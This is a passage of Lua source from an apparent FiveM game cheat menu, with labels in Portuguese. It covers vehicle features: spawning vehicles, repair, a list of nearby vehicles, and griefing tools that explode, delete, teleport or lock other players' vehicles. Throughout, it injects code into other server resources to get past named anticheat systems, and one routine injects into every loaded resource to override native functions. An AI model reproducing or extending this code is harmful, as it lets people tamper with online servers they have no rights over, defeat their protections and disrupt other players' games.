                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 8, 1)
                                end
                                if IsDisabledControlPressed(0, 34) and not IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 4, 1)
                                end
                                if IsDisabledControlPressed(0, 35) and not IsDisabledControlPressed(0, 32) and not IsDisabledControlPressed(0, 33) then
                                    TaskVehicleTempAction(PlayerPedId(), vehselected, 5, 1)
                                end
                                Wait(0)
                            end
                        end)
                        
                        next.bypass['vehicle_enter'](false)
                    end)
next.elements.checkbox("Espectar Veiculo", "especveiculo", function(bool)
    if bool then
    nt.createTh(function()
    while next.values.checkbox["especveiculo"] do
    local vehicle = next.lib.selected_vehicle
        if not vehicle or not DoesEntityExist(vehicle) then
    next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
    return
end
    FrameAPI.Inject("pma-voice", [[ _G.setSpectatorMode(true) ]])
    if DoesEntityExist(vehicle) then
    if not ped or not DoesEntityExist(ped) then
    ped = CreatePed(1, GetEntityModel(PlayerPedId()), GetEntityCoords(vehicle), 0.0, false, false)
    SetEntityAlpha(ped, 0, false)
    SetEntityVisible(ped, false, false)
    FreezeEntityPosition(ped, true)
    AttachEntityToEntity(ped, vehicle, 0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
    end
    SetGameplayCamFollowPedThisUpdate(ped)
    SetFocusEntity(ped)
    SetFocusArea(GetEntityCoords(ped), 200.0, 200.0, 200.0)
    local pos = GetEntityCoords(ped)
    local vel = GetEntityVelocity(ped)
    SetFocusPosAndVel(pos.x, pos.y, pos.z, vel.x, vel.y, vel.z)
    end
    Wait(0)
    end
    end)
    else
    SetFocusEntity(PlayerPedId())
    ClearFocus()
    FrameAPI.Inject("pma-voice", [[ _G.setSpectatorMode(false) ]])
    if ped and DoesEntityExist(ped) then
    DeleteEntity(ped)
    ped = nil
    end
    end
                        end)
                        next.elements.button("Desabilitar P1", "desabilitep1", function()
                            nt.createTh(function()
                                local player = PlayerPedId()
                                local vehicle = next.lib.selected_vehicle
                                if not vehicle or not DoesEntityExist(vehicle) then
                            next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
                            return
                        end
                                if vehicle and DoesEntityExist(vehicle) then
                                    local originalCoords = GetEntityCoords(player)
                                    local driver = GetPedInVehicleSeat(vehicle, -1)
                                    local playerVehicle = GetVehiclePedIsIn(player, false)
                                    
                                    SetVehicleExclusiveDriver_2(playerVehicle, player, 1)
                                    
                                end
                            end)
                        end)
                        next.elements.button("Tirar Rodas do veículo", "wqdqdqd", function()
                            local a = PlayerPedId()
                            local b = next.lib.selected_vehicle
                            local c = GetEntityCoords(a)
                            local d = next.functions.OcupadoVehicle(b)
                            local e = GetPedInVehicleSeat(b, -1)
                            if not b or not DoesEntityExist(b) then
                            next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
                            return
                            end
                            SetEntityCoordsNoOffset(a, GetEntityCoords(b))
                            TaskWarpPedIntoVehicle(a, b, -1)
                            for i = 0, 3 do
                                BreakOffVehicleWheel(b, i, false, false, false, false)
                            end
                            Wait(200)
                            SetEntityCoordsNoOffset(a, c.x, c.y, c.z)
                        end)
            next.elements.button("Deletar veículo", "delete", function()
                nt.createTh(function()
                    local player = PlayerPedId()
                    local vehicle = next.lib.selected_vehicle
                    if not vehicle or not DoesEntityExist(vehicle) then
                            next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
                        return
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        DeleteVehicle(vehicle)
                    end
                end)
                next.bypass.vehicle_enter(false)
            end)

next.elements.button("Explodir veículo", "exp", function()
    nt.createTh(function()
        local player = PlayerPedId()
        local vehicle = next.lib.selected_vehicle
        if not vehicle or not DoesEntityExist(vehicle) then
            next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
            return
        end
        if vehicle and DoesEntityExist(vehicle) then
            local originalCoords = GetEntityCoords(player)
            local driver = GetPedInVehicleSeat(vehicle, -1)
            
            next.bypass.vehicle_enter(true)
            if DoesEntityExist(driver) and driver ~= 0 and driver ~= player then
                TaskWarpPedIntoVehicle(player, vehicle, -1)
            end
            Wait(200)
            AddVehiclePhoneExplosiveDevice(vehicle)
            Wait(50)
            SetEntityCoordsNoOffset(player, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            Wait(10)
            DetonateVehiclePhoneExplosiveDevice()
            
            next.bypass.vehicle_enter(false)
        end
    end)
end)
next.elements.button("Jogar Veiculo no Mt.Chilliad", "mtChilliad", function()
    nt.createTh(function()
        local player = PlayerPedId()
        local vehicle = next.lib.selected_vehicle
        if not vehicle or not DoesEntityExist(vehicle) then
                next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
            return
        end
        if vehicle and DoesEntityExist(vehicle) then
            local originalCoords = GetEntityCoords(player)
            local driver = GetPedInVehicleSeat(vehicle, -1)
            
            if DoesEntityExist(driver) and driver ~= 0 and driver ~= player then
                TaskWarpPedIntoVehicle(player, vehicle, -1)
            end
            Wait(200)
            SetEntityCoordsNoOffset(vehicle, 501.58, 5599.20, 796.29, false, false, false, true)
            Wait(100)
            SetEntityCoordsNoOffset(player, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            
        end
    end)
    next.bypass.vehicle_enter(false)
end)
next.elements.button("Jogar Veiculo no Oceano", "marmediterranio", function()
    nt.createTh(function()
        local player = PlayerPedId()
        local vehicle = next.lib.selected_vehicle
        if not vehicle or not DoesEntityExist(vehicle) then
            next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
            return
        end
        if vehicle and DoesEntityExist(vehicle) then
            local originalCoords = GetEntityCoords(player)
            local driver = GetPedInVehicleSeat(vehicle, -1)
            
            if DoesEntityExist(driver) and driver ~= 0 and driver ~= player then
                TaskWarpPedIntoVehicle(player, vehicle, -1)
            end
            Wait(200)
            SetEntityCoordsNoOffset(vehicle, 3203.76, -4039.12, 0.0, false, false, false, true)
            Wait(100)
            SetEntityCoordsNoOffset(player, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            
        end
    end)
    next.bypass.vehicle_enter(false)
end)
next.elements.groupbox("Spawn Carro", "spawncarros", "\xef\x92\x9e", 0, 305, 270, 140)
next.elements.input("Nome do Veículo", "nome_veiculo", "")
next.elements.button("Spawnar Veículo", "spawnarVeh", function()
    local vehicleName = next.values.input["nome_veiculo"]
    local spawnInside = next.values.checkbox["spawn_dentro"] or false
    if not vehicleName or vehicleName == "" then
        next.elements.notify("Digite o nome do veículo!", "error")
        return
    end
    if anticheat == "PL_PROTECT" then
        next.elements.notify("Cidade sem suporte (PL_PROTECT)", "error")
        return
    elseif GetResourceState('infinity_doors') == 'started' then
        local code = string.format([[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local hash = GetHashKey("%s")
            RequestModel(hash)
            while not HasModelLoaded(hash) do
                Wait(0)
            end
            local vehicle = CreateVehicle(hash, coords.x, coords.y, coords.z, 0.0, true, false)
            SetModelAsNoLongerNeeded(hash)
            NetworkRegisterEntityAsNetworked(vehicle)
        ]], vehicleName)
        FrameAPI.Inject('vrp_creator', code)
    elseif anticheat == "Fiveguard" and anticheat == "likizao_ac" and anticheat == "ThnAC" then
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local hash = GetHashKey(vehicleName)
        next.SpawnVehicleLikizao(hash)
        if spawnInside then
            SetPedIntoVehicle(ped, vehicle, -1)
        end
    elseif GetResourceState('offset_main') == 'started' then
        local code = string.format([[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local hash = GetHashKey("%s")
            RequestModel(hash)
            while not HasModelLoaded(hash) do
                Wait(0)
            end
            local vehicle = CreateVehicle(hash, coords.x, coords.y, coords.z, 0.0, true, false)
            SetModelAsNoLongerNeeded(hash)
            NetworkRegisterEntityAsNetworked(vehicle)
        ]], vehicleName)
        FrameAPI.Inject('offset_main', code)
    elseif anticheat == "MQCU" then
        nt.createTh(function()
            local lafy = [[
                Citizen.CreateThread(function()
                while true do
                    CreateVehicle = function()
                        return 0
                    end
                    local vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 8.0, 0, 70)
                    DoesEntityExist = function(vehicle)
                        return false
                    end
                    DeleteEntity = function()
                        return 0
                    end
                    Wait(0)
                end
                end)
            ]]
            FrameAPI.Inject('MQCU', lafy)
            FrameAPI.Inject('vrp', lafy)
            FrameAPI.Inject('inventory', string.format([[
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local vehicleName = "%s"
                local hash = GetHashKey(vehicleName)
                RequestModel(hash)
                local vehicle = CreateVehicle(hash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleOnGroundProperly(vehicle)
                SetVehicleHasBeenOwnedByPlayer(vehicle, true)
                SetVehicleNeedsToBeHotwired(vehicle, false)
                SetVehicleEngineOn(vehicle, true, true, false)
                SetVehicleDoorsLocked(vehicle, 1)
            ]], vehicleName))
        end)
    elseif GetResourceState('santa_radio') == 'started' then
        FrameAPI.Inject('santa_radio', string.format([[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicleName = "%s"
            local hash = GetHashKey(vehicleName)
            RequestModel(hash)
            local vehicle = CreateVehicle(hash, coords.x + 200, coords.y + 200, coords.z, GetEntityHeading(ped), true, false)
            local vehicle2 = CreateVehicle(hash, coords.x - 200, coords.y - 200, coords.z, GetEntityHeading(ped), true, false)
            SetEntityAsMissionEntity(vehicle, true, true)
            SetEntityAsMissionEntity(vehicle2, true, true)
            SetVehicleOnGroundProperly(vehicle)
            SetVehicleOnGroundProperly(vehicle2)
            SetVehicleHasBeenOwnedByPlayer(vehicle, true)
            SetVehicleHasBeenOwnedByPlayer(vehicle2, true)
            SetVehicleNeedsToBeHotwired(vehicle, false)
            SetVehicleNeedsToBeHotwired(vehicle2, false)
            SetVehicleEngineOn(vehicle, true, true, false)
            SetVehicleEngineOn(vehicle2, true, true, false)
            SetVehicleDoorsLocked(vehicle, 1)
            SetVehicleDoorsLocked(vehicle2, 1)
            SetEntityNoCollisionEntity(vehicle, vehicle2, true)
            NetworkRegisterEntityAsNetworked(vehicle)
            NetworkRegisterEntityAsNetworked(vehicle2)
            Wait(1000)
            if DoesEntityExist(vehicle) or DoesEntityExist(vehicle2) then
                local cds = GetEntityCoords(ped)
                SetVehicleOnGroundProperly(vehicle)
                SetVehicleOnGroundProperly(vehicle2)
                SetEntityCoords(vehicle, cds.x, cds.y, cds.z, false, false, false, false)
                SetEntityCoords(vehicle2, cds.x, cds.y, cds.z, false, false, false, false)
            end
            if %s then
                if DoesEntityExist(vehicle) then
                    SetPedIntoVehicle(ped, vehicle, -1)
                elseif DoesEntityExist(vehicle2) then
                    SetPedIntoVehicle(ped, vehicle2, -1)
                end
            end
            if DoesEntityExist(vehicle) and DoesEntityExist(vehicle2) then
                DeleteEntity(vehicle2)
            end
        ]], vehicleName, tostring(spawnInside)))
    elseif GetResourceState('liberdade_garagem') == 'started' then
        FrameAPI.Inject('radio', string.format([[
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicleName = "%s"
            local hash = GetHashKey(vehicleName)
            RequestModel(hash)
            local vehicle = CreateVehicle(hash, coords.x + 200, coords.y + 200, coords.z, GetEntityHeading(ped), true, false)
            local vehicle2 = CreateVehicle(hash, coords.x - 200, coords.y - 200, coords.z, GetEntityHeading(ped), true, false)
            SetEntityAsMissionEntity(vehicle, true, true)
            SetEntityAsMissionEntity(vehicle2, true, true)
            SetVehicleOnGroundProperly(vehicle)
            SetVehicleOnGroundProperly(vehicle2)
            SetVehicleHasBeenOwnedByPlayer(vehicle, true)
            SetVehicleHasBeenOwnedByPlayer(vehicle2, true)
            SetVehicleNeedsToBeHotwired(vehicle, false)
            SetVehicleNeedsToBeHotwired(vehicle2, false)
            SetVehicleEngineOn(vehicle, true, true, false)
            SetVehicleEngineOn(vehicle2, true, true, false)
            SetVehicleDoorsLocked(vehicle, 1)
            SetVehicleDoorsLocked(vehicle2, 1)
            SetEntityNoCollisionEntity(vehicle, vehicle2, true)
            NetworkRegisterEntityAsNetworked(vehicle)
            NetworkRegisterEntityAsNetworked(vehicle2)
            Wait(1000)
            if DoesEntityExist(vehicle) or DoesEntityExist(vehicle2) then
                local cds = GetEntityCoords(ped)
                SetVehicleOnGroundProperly(vehicle)
                SetVehicleOnGroundProperly(vehicle2)
                SetEntityCoords(vehicle, cds.x, cds.y, cds.z, false, false, false, false)
                SetEntityCoords(vehicle2, cds.x, cds.y, cds.z, false, false, false, false)
            end
            if %s then
                if DoesEntityExist(vehicle) then
                    SetPedIntoVehicle(ped, vehicle, -1)
                elseif DoesEntityExist(vehicle2) then
                    SetPedIntoVehicle(ped, vehicle2, -1)
                end
            end
            if DoesEntityExist(vehicle) and DoesEntityExist(vehicle2) then
                DeleteEntity(vehicle2)
            end
        ]], vehicleName, tostring(spawnInside)))
        nt.createTh(function()
            if IsPedInAnyVehicle(PlayerPedId(), false) then
                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                SetVehicleUndriveable(vehicle, false)
            end
        end)
    elseif anticheat == "ThnAC" then
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local hash = GetHashKey(vehicleName)
        next.SpawnVehicleLikizao(hash)
        if spawnInside then
            SetPedIntoVehicle(ped, vehicle, -1)
        end
    elseif GetResourceState('lotus_farmafk') == 'started' then
        next.elements.notify("Cidade sem suporte (Lotus)", "error")
    else
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        local hash = GetHashKey(vehicleName)
        RequestModel(hash)
        while not HasModelLoaded(hash) do Wait(0) end
        local vehicle = CreateVehicle(hash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)
        if spawnInside then
            SetPedIntoVehicle(ped, vehicle, -1)
        end
    end
end)
    next.elements.checkbox("Spawnar Tunado", "spawn_tunado", function(bool)
    end)
                if group == "Nexus Group" or group == "Space Group" or group == "Noway Group" or group == "Lotus Group" then
                next.elements.button("Cidade sem suporte!" , "citysemportwe", function()
                end)
        end
                        next.elements.groupbox("Lista de veículos", "lista:veh", "\xef\x92\x9e", 280, 0, 270, 300)
                        next.elements.input("Pesquisar:", "vehicle_search", "", true)
local ped = PlayerPedId()
local pedCoords = GetEntityCoords(ped)
local filter = next.values.input and next.values.input["vehicle_search"] or ""
filter = string.lower(tostring(filter))
local mostrarApenasLivres = next.values.checkbox["mostrar_apenas_livres"] or false
local mostrarApenasOcupados = next.values.checkbox["mostrar_apenas_ocupados"] or false
local ocultarCarrosVisuais = next.values.checkbox["ocultar_carros_visuais"] or false
local vehicles = {}
local allVehicles = {}
if type(GetGamePool) == 'function' then
    local okPool, pool = pcall(GetGamePool, 'CVehicle')
    if okPool and type(pool) == 'table' then
        allVehicles = pool
    end
end
if #allVehicles == 0 and type(FindFirstVehicle) == 'function' and type(FindNextVehicle) == 'function' then
    pcall(function()
        local handle, veh = FindFirstVehicle()
        if handle and handle ~= -1 then
            local success = true
            while success do
                if veh and veh ~= 0 then
                    table.insert(allVehicles, veh)
                end
                success, veh = FindNextVehicle(handle)
            end
            if type(EndFindVehicle) == 'function' then
                EndFindVehicle(handle)
            end
        end
    end)
end
for _, veh in ipairs(allVehicles) do
    if veh and veh ~= 0 and DoesEntityExist(veh) then
        local isVisual = false
        if type(NetworkGetEntityIsNetworked) == 'function' then
            local okNetworked, networked = pcall(NetworkGetEntityIsNetworked, veh)
            if okNetworked then
                isVisual = not networked
            end
        end
        if ocultarCarrosVisuais and isVisual then
            goto continue
        end
        local model = GetEntityModel(veh)
        local modelName = tostring(model or 'VEHICLE')
        if type(GetDisplayNameFromVehicleModel) == 'function' then
            local okModelName, rawModelName = pcall(GetDisplayNameFromVehicleModel, model)
            if okModelName and rawModelName and tostring(rawModelName) ~= '' then
                modelName = tostring(rawModelName)
            end
        end
        local label = nil
        if type(GetLabelText) == 'function' then
            local okLabel, rawLabel = pcall(GetLabelText, modelName)
            if okLabel and rawLabel and rawLabel ~= 'NULL' and tostring(rawLabel) ~= '' then
                label = tostring(rawLabel)
            end
        end
        local displayName = tostring(label or modelName or 'VEHICLE')
        local maxDisplayLen = 35
        if #displayName > maxDisplayLen then
            displayName = displayName:sub(1, maxDisplayLen) .. "..."
        end
        if filter ~= "" then
            local displayLower = string.lower(displayName)
            local modelLower = string.lower(tostring(modelName))
            if not (displayLower:find(filter, 1, true) or modelLower:find(filter, 1, true)) then
                goto continue
            end
        end
        local vehCoords = GetEntityCoords(veh)
        local distance = #(pedCoords - vehCoords)
        local ocupado = false
        local maxPassengers = tonumber(GetVehicleMaxNumberOfPassengers(veh)) or 0
        for seat = -1, math.max(-1, maxPassengers - 1) do
            if not IsVehicleSeatFree(veh, seat) then
                ocupado = true
                break
            end
        end
        if mostrarApenasLivres and ocupado then
            goto continue
        end
        if mostrarApenasOcupados and not ocupado then
            goto continue
        end
        table.insert(vehicles, {
            vehicle = veh,
            name = displayName,
            distance = distance,
            occupied = ocupado,
            visual = isVisual
        })
    end
    ::continue::
end
table.sort(vehicles, function(a, b)
    return a.distance < b.distance
end)
local name_counts = {}
for _, vehData in ipairs(vehicles) do
    name_counts[vehData.name] = (name_counts[vehData.name] or 0) + 1
end
local name_indices = {}
for _, vehData in ipairs(vehicles) do
    if name_counts[vehData.name] > 1 then
        name_indices[vehData.name] = (name_indices[vehData.name] or 0) + 1
        if name_indices[vehData.name] == 1 then
            vehData.displayNameWithIndex = vehData.name
        else
            vehData.displayNameWithIndex = vehData.name .. " #" .. tostring(name_indices[vehData.name] - 1)
        end
    else
        vehData.displayNameWithIndex = vehData.name
    end
    if #vehData.displayNameWithIndex > 35 then
        vehData.displayNameWithIndex = vehData.displayNameWithIndex:sub(1, 35) .. "..."
    end
end
for _, vehData in ipairs(vehicles) do
    local selectedcarlist = next.lib.selected_vehicle == vehData.vehicle
    local vtext = string.format("%.0f", vehData.distance) .. "m"
    local status = vehData.occupied and "[Ocupado]" or "[Livre]"
    local visualStatus = vehData.visual and "[Visual]" or ""
    local customDisplayName = string.format("%s - %s - %s %s", vehData.displayNameWithIndex, vtext, status, visualStatus):gsub("%s+$", "")
    if #customDisplayName > 35 then
        customDisplayName = customDisplayName:sub(1, 35) .. "..."
    end
    next.elements.list(
        vehData.vehicle,
        selectedcarlist,
        function()
            if selectedcarlist then
                next.lib.selected_vehicle = nil
            else
                next.lib.selected_vehicle = vehData.vehicle
            end
        end,
        customDisplayName
    )
end
    next.elements.groupbox("Config Lista", "configlistadeveiculo", "\xee\x93\xa9", 280, 305, 270, 140)
                        next.elements.checkbox("Mostra Apenas Livres", "mostrar_apenas_livres", function(bool)
                        end)
                        next.elements.checkbox("Mostrar Apenas Ocupados", "mostrar_apenas_ocupados", function(bool)
                        end)
                        next.elements.checkbox("Ocultar Visuais", "ocultar_carros_visuais", function(bool)
                        end)
                    elseif next.vars.subtab_selected == "Meu Veiculo" then
                        next.elements.groupbox("Trolls [My Vehicle]", "qdqwdqwdqwd", "\xef\x97\xa1", 280, 0, 270, 200)
                        local veiculosInvisiveis = {}
                        next.elements.button("Barreira com Veiculo", "barreira", function()
                            local ped = PlayerPedId()
                            local veiculo = GetVehiclePedIsIn(ped, false)
                            if veiculo ~= 0 then
                                veiculosInvisiveis[veiculo] = true
                                SetEntityVisible(veiculo, false, false)
                                FreezeEntityPosition(veiculo, true)
                                Wait(100)
                                TaskLeaveVehicle(ped, veiculo, 16)
                                SetEntityVisible(ped, true, true)
                            end
                        nt.createTh(function()
                            while true do
                                Wait(0)
                                for veiculo, _ in pairs(veiculosInvisiveis) do
                                    if DoesEntityExist(veiculo) then
                                        SetEntityVisible(veiculo, false, false)
                                        FreezeEntityPosition(veiculo, true)
                                    else
                                        veiculosInvisiveis[veiculo] = nil
                                    end
                                end
                            end
                        end)
                        end)
                        next.elements.button("Jogar Veiculo no Mar", "jogar_veiculo_mar", function()
                            local player = PlayerPedId()
                            local veh = next.lib.selected_vehicle
                            if not veh or not DoesEntityExist(veh) then
                            next.elements.notify("Nenhum veículo selecionado ou não encontrado!", "error")
                            return
                            
                        end
                            if veh and DoesEntityExist(veh) then
                            
                            local coords = GetEntityCoords(player)
                            TaskWarpPedIntoVehicle(player, veh, -1)
                            Wait(100)
                            ClearPedTasksImmediately(player)
                            SetEntityCoordsNoOffset(veh, 3203.767, -4039.129, 201.3459)
                            SetEntityCoordsNoOffset(player, coords.x, coords.y, coords.z)
                            next.elements.notify("Veículo Jogado no Mar", "success")
                            
                            else
                            
                            end
                            end)
                                next.elements.button("Remover Rodas", "retirarpneusdomeucarro", function()
                                    local a = PlayerPedId()
                                    local b = GetVehiclePedIsIn(PlayerPedId(), false)
                                    local c = GetEntityCoords(a)
                                    local d = next.functions.OcupadoVehicle(b)
                                    if d then
                                        next.removerplayer(e)
                                        Wait(500)
                                        TaskWarpPedIntoVehicle(player, vehicle, -1)
                                    end
                                    Wait(200)
                                    TaskWarpPedIntoVehicle(a, b, -1)
                                    for i = 0, 3 do
                                        BreakOffVehicleWheel(b, i, false, false, false, false)
                                    end
                                    Wait(200)
                                    SetEntityCoordsNoOffset(a, GetEntityCoords(b))
                                end)
                        next.elements.button("Deletar Veículo", "deletar_veiculo", function()
                            local veh = next.functions.GetVehicle()
                            if veh then
                                SetEntityAsMissionEntity(veh, true, true)
                                DeleteVehicle(veh)
                            next.elements.notify("Veiculo Deletado", "success")
                            end
                        end)
                        next.elements.groupbox("Extras", "extrascarros", "\xef\x81\xba", 280, 220, 270, 223)
                        next.elements.input("Plate:", "pesquisarssss", "")
                        next.elements.button("Setar Placa", "placaa", function()
                            local v = next.functions['GetVehicle']()
                            SetVehicleNumberPlateText(v, next.values.input["pesquisarssss"])
                        end)
                        next.elements.button("Cor Aleatoria", "aleatoria", function()
                            local r = math.random(0, 255)
                            local g = math.random(0, 255)
                            local b = math.random(0, 255)
                            next.colorbypass(true)
                            SetVehicleCustomPrimaryColour(next.functions['GetVehicle'](), r, g, b)
                        end)
                        next.elements.button("TP Veículo Próximo", "tp_veiculo_proximo", function()
                            nt.createTh(function()
                        local coords = GetEntityCoords(PlayerPedId())
                        local veiculoprox = GetClosestVehicle(coords.x, coords.y, coords.z, 15.0, 0, 70)
                        if DoesEntityExist(veiculoprox) then
                        if anticheat == "EQPG" then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veiculoprox, -1)
                        else
                        SetPedIntoVehicle(PlayerPedId(), veiculoprox, -1)
                        end
                        end
                        end)
                        end)
                        next.elements.button("Trancar Veiculos", "trancar_veiculos", function()
                            nt.createTh(function()
                            for k,v in pairs(GetGamePool("CVehicle")) do
                            if DoesEntityExist(v) then
                            SetVehicleDoorsLocked(v, 0)
                            SetVehicleDoorsLockedForPlayer(v, PlayerId(), true)
                            SetVehicleDoorsLockedForAllPlayers(v, true)
                            end
                            end
                            end)()
                            end)
                            next.elements.checkbox("Trancar Veiculos em Loop", "trancar_auto_loop", function()
                                if next.values.checkbox["trancar_auto_loop"] then
                                    nt.createTh(function()
                                        while next.values.checkbox["trancar_auto_loop"] do
                                            for _, veh in pairs(GetGamePool("CVehicle")) do
                                                if DoesEntityExist(veh) then
                                                    SetVehicleDoorsLocked(veh, 0)
                                                    SetVehicleDoorsLockedForPlayer(veh, PlayerId(), true)
                                                    SetVehicleDoorsLockedForAllPlayers(veh, true)
                                                end
                                            end
                                            Wait(200)
                                        end
                                    end)
                                end
                            end)
                        next.elements.button("Destrancar Veiculos", "destrancar_eiculos", function()
                            nt.createTh(function()
                            for k,v in pairs(GetGamePool("CVehicle")) do
                            if DoesEntityExist(v) then
                            SetVehicleDoorsLocked(v, 1)
                            SetVehicleDoorsLockedForPlayer(v, PlayerId(), false)
                            SetVehicleDoorsLockedForAllPlayers(v, false)
                            end
                            end
                            end)
                            end)
                            next.elements.checkbox("Destrancar Veiculos em Loop", "destrancar_auto_loop", function()
                                if next.values.checkbox["destrancar_auto_loop"] then
                                    nt.createTh(function()
                                        while next.values.checkbox["destrancar_auto_loop"] do
                                            for _, veh in pairs(GetGamePool("CVehicle")) do
                                                if DoesEntityExist(veh) then
                                                    SetVehicleDoorsLocked(veh, 0)
                                                    SetVehicleDoorsLockedForPlayer(veh, PlayerId(), false)
                                                    SetVehicleDoorsLockedForAllPlayers(veh, false)
                                                end
                                            end
                                            Wait(200)
                                        end
                                    end)
                                end
                            end)
                            next.elements.button("Deletar Veículo Próximo", "deletar_veiculo_proximo", function()
                                nt.createTh(function()
                                local coords = GetEntityCoords(PlayerPedId())
                                local veiculoprox = GetClosestVehicle(coords.x, coords.y, coords.z, 200.0, 0, 70)
                                if DoesEntityExist(veiculoprox) then
                                if anticheat == "EQPG" then
                                TaskWarpPedIntoVehicle(PlayerPedId(), veiculoprox, -1)
                                else
                                SetPedIntoVehicle(PlayerPedId(), veiculoprox, -1)
                                end
                                SetEntityAsMissionEntity(veiculoprox, true, true)
                                DeleteVehicle(veiculoprox)
                                Wait(100)
                                SetEntityCoordsNoOffset(PlayerPedId(), coords.x, coords.y, coords.z, false, true, false, false)
                                else
                                next.elements.notify("Nenhum veículo próximo do seu jogador.", "error")
                                end
                                end)
                                end)
                        next.elements.groupbox("Meu Veiculo", "radar", "\xef\x9f\x9a", 0, 0, 270, 445)
                        next.elements.button("Reparar Veículo", "reparar_veiculo", function()
                            nt.createTh(function()
                                for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
                                FrameAPI.Inject(resourceName, [[
                                    Citizen.CreateThread(function()
                                        _hxp_repair_ver = (_hxp_repair_ver or 0) + 1
                                        local myVersion = _hxp_repair_ver

                                        local function repairOverrides()
                                            SetVehicleFixed              = function() return true end
                                            SetVehicleBodyHealth         = function() return true end
                                            SetVehicleEngineHealth       = function() return true end
                                            SetVehiclePetrolTankHealth   = function() return true end
                                            SetVehicleOnGroundProperly   = function() return true end
                                            SetVehicleDeformationFixed   = function() return true end
                                            SetVehicleUndriveable        = function() return true end
                                            SetVehicleDirtLevel          = function() return true end
                                            SetVehicleTyreFixed          = function() return true end
                                            SetVehicleWheelHealth        = function() return true end
                                            SetVehicleDoorBroken         = function() return true end
                                            SetVehicleGlassSmash         = function() return true end
                                            SetVehicleCanBeVisiblyDamaged= function() return true end
                                            SetVehicleEngineOn           = function() return true end
                                            SetVehicleDamage              = function() return true end
                                            _G.SetVehicleFixed            = function() return true end
                                            _G.SetVehicleBodyHealth       = function() return true end
                                            _G.SetVehicleEngineHealth     = function() return true end
                                            _G.SetVehiclePetrolTankHealth = function() return true end
                                            _G.SetVehicleOnGroundProperly = function() return true end
                                            _G.SetVehicleDeformationFixed = function() return true end
                                            _G.SetVehicleUndriveable      = function() return true end
                                            _G.SetVehicleDirtLevel        = function() return true end
                                            _G.SetVehicleTyreFixed        = function() return true end
                                            _G.SetVehicleWheelHealth      = function() return true end
                                        end

                                        local function repairValues()
                                            SetVehicleFixed              = function() end
                                            SetVehicleBodyHealth         = function() end
                                            SetVehicleEngineHealth       = function() end
                                            SetVehiclePetrolTankHealth   = function() end
                                            SetVehicleOnGroundProperly   = function() end
                                        end

                                        local ok, err = pcall(function()
                                            repairOverrides()
                                        end)

                                        Citizen.CreateThread(function()
                                            pcall(repairOverrides)
                                        end)
                                    end)
                                    Wait(10)
                                    print('oi')
                                ]])
                            end
                                local veh = next.functions.GetVehicle()
                                local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                            if not vehicle or vehicle == 0 then
                                next.elements.notify("Entre em um Veiculo Primeiro!", "warning")
                                return
                            end
                                if veh then
                                    SetVehicleFixed(veh)
                                    SetVehicleBodyHealth(veh, 1000.0)
                                    SetVehicleEngineHealth(veh, 1000.0)
                                    SetVehiclePetrolTankHealth(veh, 1000.0)
                                    SetVehicleOnGroundProperly(veh)
                                    next.elements.notify("Veiculo Reparado", "success")
                                end
                            end)
                        end)
                        next.elements.button("Desvirar Veiculo", "desvirar_veiculo", function()
                               local x, y, z = GetEntityRotation(GetVehiclePedIsIn(PlayerPedId()))
                               SetEntityRotation(GetVehiclePedIsIn(PlayerPedId()), 0, 0, 0)
                               next.elements.notify("Veiculo Desvirado", "success")
                          end)
                        next.elements.button("Reparar Motor", "reparar_motor", function()
                            nt.createTh(function()
                                SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
                                SetVehicleBodyHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
                                next.elements.notify("Veiculo Reparado", "success")
                            end)
                        end)
                            next.elements.button("Encher Gasolina", "encher_gasolina", function()
                                SetVehicleFuelLevel(GetVehiclePedIsIn(PlayerPedId()), 100)
                            end)
                            next.elements.checkbox("Gasolina Infinita", "gasolinainfinita", function()
                                while next.values.checkbox["gasolinainfinita"] do
                                    SetVehicleFuelLevel(GetVehiclePedIsIn(PlayerPedId()), 100)
                                    Wait(1)
                                end
                            end)
                            next.elements.button("Limpar Sujeira do Veiculo", "limpar_sujeira_veiculo", function()
                                SetVehicleDirtLevel(GetVehiclePedIsIn(PlayerPedId()), 0)
                                end)
                                next.elements.checkbox("Piloto Automatico", "pilote_ontop", function(bool)
                            nt.createTh(function()
                            if not bool then
                            ClearPedTasks(PlayerPedId())
                            ClearPedTasksImmediately(PlayerPedId())
                            return
                            end
                            if DoesBlipExist(GetFirstBlipInfoId(8)) then
                            local coords = InvokeNative(0xFA7C7F0AADF25D09, GetFirstBlipInfoId(8, GetBlipInfoIdIterator(8)), ResultAsVector())
                            ClearPedTasks(PlayerPedId())
                            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
